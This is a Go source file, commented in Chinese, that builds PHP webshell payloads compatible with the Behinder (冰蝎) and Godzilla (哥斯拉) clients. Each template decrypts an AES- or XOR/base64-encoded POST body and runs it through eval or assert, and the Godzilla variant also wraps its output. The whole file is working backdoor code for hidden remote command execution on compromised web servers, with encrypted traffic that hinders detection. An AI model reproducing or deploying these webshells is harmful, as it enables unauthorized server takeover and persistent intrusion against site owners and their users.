package payload

import (
	"crypto/md5"
	"fmt"
)

// 加密协议模板（仅 PHP）。与 webshellproto 客户端执行体成对交付：
// 密钥同派生方式（md5(pass) 十六进制串前 16 字节，兼作 IV / XOR 轮转 key）。
//
//	behinder : 冰蝎3式——POST 体 AES-128-CBC(eval|<php 代码>)，与原版冰蝎3 PHP 马
//	           客户端兼容（原版模板同样解密后按 | 切分 eval 第二段）。
//	godzilla : 哥斯拉式（PHP_XOR_BASE64 变形）——POST 体 base64(xor(php 代码, key))；
//	           响应 base64(xor(md5(key)[16:]+base64(输出)+md5(key)[:16], key))，
//	           由 Unwrap 还原。

// deriveKey16 协议密钥派生（与 DeriveKey 保持一致）。
func deriveKey16(password string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(password)))[:16]
}

// behinderPhpTemplate 冰蝎3式 AES 通道马。
func behinderPhpTemplate(password, watermark string) string {
	key := deriveKey16(password)
	return fmt.Sprintf(`<?php /*%s*/
@error_reporting(0);
$k='%s';
$post=file_get_contents('php://input');
$d=false;
if(function_exists('openssl_decrypt')){
    $d=openssl_decrypt($post,'AES-128-CBC',$k,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING,$k);
    if(is_string($d)){$n=ord(substr($d,-1));if($n>=1&&$n<=16&&substr($d,-$n)===str_repeat(chr($n),$n)){$d=substr($d,0,strlen($d)-$n);}}
}
if(!is_string($d)){echo 'WE';exit;}
$p=explode('|',$d,2);
if(count($p)===2){if($p[0]==='assert'){@assert($p[1]);}else{eval($p[1]);}}else{eval($d);}
?>`, watermark, key)
}

// godzillaPhpTemplate 哥斯拉式 XOR+base64 通道马（响应包裹算法与客户端约定见文件头注释）。
func godzillaPhpTemplate(password, watermark string) string {
	key := deriveKey16(password)
	return fmt.Sprintf(`<?php /*%s*/
@error_reporting(0);
$k='%s';
$x=base64_decode(file_get_contents('php://input'));
$s='';
for($i=0;$i<strlen($x);$i++){$s.=$x[$i]^$k[$i%%16];}
ob_start();
eval($s);
$o=ob_get_clean();
$m=md5($k);
$r=$m.base64_encode($o).substr($m,0,16);
$x2='';
for($i=0;$i<strlen($r);$i++){$x2.=$r[$i]^$k[$i%%16];}
echo base64_encode($x2);
?>`, watermark, key)
}
